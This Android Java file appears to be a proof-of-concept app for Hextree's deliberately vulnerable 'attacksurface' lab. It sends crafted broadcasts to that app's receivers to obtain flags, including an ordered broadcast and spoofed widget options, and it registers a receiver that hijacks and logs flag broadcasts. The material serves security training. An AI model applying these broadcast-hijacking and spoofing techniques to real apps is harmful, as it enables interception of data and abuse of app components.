package com.bedo.poc_app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.util.Log;
import android.view.View;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class Broadcast_Labs extends AppCompatActivity {

    private BroadcastReceiver Hijacker18_21 = new BroadcastReceiver() {
        /*
            addFlags(8) => Intent.FLAG_RECEIVER_REGISTERED_ONLY
                Will work with dynamic broadcast, Dosn't work wit reciver register in manifest
        */
        @Override
        public void onReceive(Context context, Intent intent) {
            setResultCode(1);
            String flag = intent.getStringExtra("flag");
            Log.d("Hijacked Flag: ",flag);
        }

    };



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_broadcast_labs);

        IntentFilter filter = new IntentFilter();
        filter.addAction("io.hextree.broadcast.FREE_FLAG");
        filter.addAction("io.hextree.broadcast.GIVE_FLAG");
        registerReceiver(Hijacker18_21,filter);

    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    unregisterReceiver(Hijacker18_21);
    }

    public void Flag16(View view) {
        Intent Flag16 = new Intent()
                .setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag16Receiver");
        Flag16.putExtra("flag","give-flag-16");
        sendBroadcast(Flag16);
    }

    public void Flag17(View view) {
        Intent Flag17 = new Intent()
                .setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag17Receiver");
        Flag17.putExtra("flag","give-flag-17");
        sendOrderedBroadcast(Flag17,null);
    }

    public void Flag19(View view) {
        Intent Flag19 = new Intent("APPWIDGET_UPDATE")
                .setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag19Widget");
        Bundle bundle = new Bundle();
        bundle.putInt("appWidgetMaxHeight",1094795585);
        bundle.putInt("appWidgetMinHeight",322376503);

        Flag19.putExtra("appWidgetOptions",bundle);
        sendBroadcast(Flag19);


    }

    public void Flag20(View view) {
        Intent implicet = new Intent("io.hextree.broadcast.GET_FLAG");
        implicet.putExtra("give-flag",true);
        sendBroadcast(implicet);
    }


}